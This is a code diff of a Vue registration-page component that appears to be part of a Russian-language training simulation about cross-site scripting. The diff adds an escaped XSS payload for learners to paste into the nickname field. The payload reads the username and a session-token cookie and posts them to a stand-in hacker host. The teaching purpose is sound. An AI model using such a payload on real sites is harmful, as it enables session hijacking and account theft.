@@ -12,25 +12,27 @@
 
     <div class="vk__registration__form">
       <p style="font-size: 1.5vw; font-weight: 500">РЕГИСТРАЦИЯ</p>
-      <input class="vk__registration__input" placeholder="Никнейм" type="text" />
-      <input class="vk__registration__input" placeholder="Пароль" type="password" />
+      <input class="vk__registration__input" placeholder="Никнейм" type="text"/>
+      <input class="vk__registration__input" placeholder="Пароль" type="password"/>
       <button class="vk__registration__btn">ЗАРЕГИСТРИРОВАТЬСЯ</button>
     </div>
     <anonymous-modal text-message="Тут мы введём никнейм (имя) пользователя c  закрывающим
                                   <br />HTML-тегом и скриптом, в котором будет код, отправляющий данные пользователя на адрес хакера.
                                   <br /><br />Рассмотрите и скопируйте код из чёрного окна, вставьте в поле “Никнейм”."></anonymous-modal>
-    <div class="vk__helper">
       <div class="vk__helper__message">
-        Надо вставить текст
+        <span>NoName&lt;/span&gt;&lt;script&gt;<br/>
+        const username = document.querySelector('.username').textContent;<br/>
+        const sessionCookie = document.cookie.match(/session-token=([^;$]+)/)[1];<br/>
+        console.log(username, sessionCookie);<br/>
+        fetch('http:/iamhacker.net',{<br/>
+        method: 'post',<br/>
+        body:JSON.stringify({username,sessionCookie})});&lt;/script&gt;</span>
       </div>
-    </div>
   </div>
 </template>
 
 <script>
-export default {
-
-}
+export default {}
 </script>
 
 <style scoped>
@@ -99,26 +101,18 @@ img {
   border-radius: 0.7vw;
 }
 
-.vk__helper {
-  position: absolute;
-  left: 5%;
-  bottom: 5%;
-  z-index: 200;
-  display: inline-flex;
-  justify-content: flex-end;
-  align-items: flex-end;
-  gap: 0 -45px;
-  flex-wrap: wrap;
-}
-
 .vk__helper__message {
   border-radius: 1vw;
   background: #263238;
-  width: 30vw;
-  position: relative;
+  width: 50vw;
+  position: absolute;
   right: -3vw;
   z-index: 100;
+  left: 5%;
+  bottom: 5%;
   padding: 1.5vw 3vw 1.5vw 1.5vw;
+}
+.vk__helper__message span {
   color: rgba(53, 255, 49, 1);
 }
 </style>
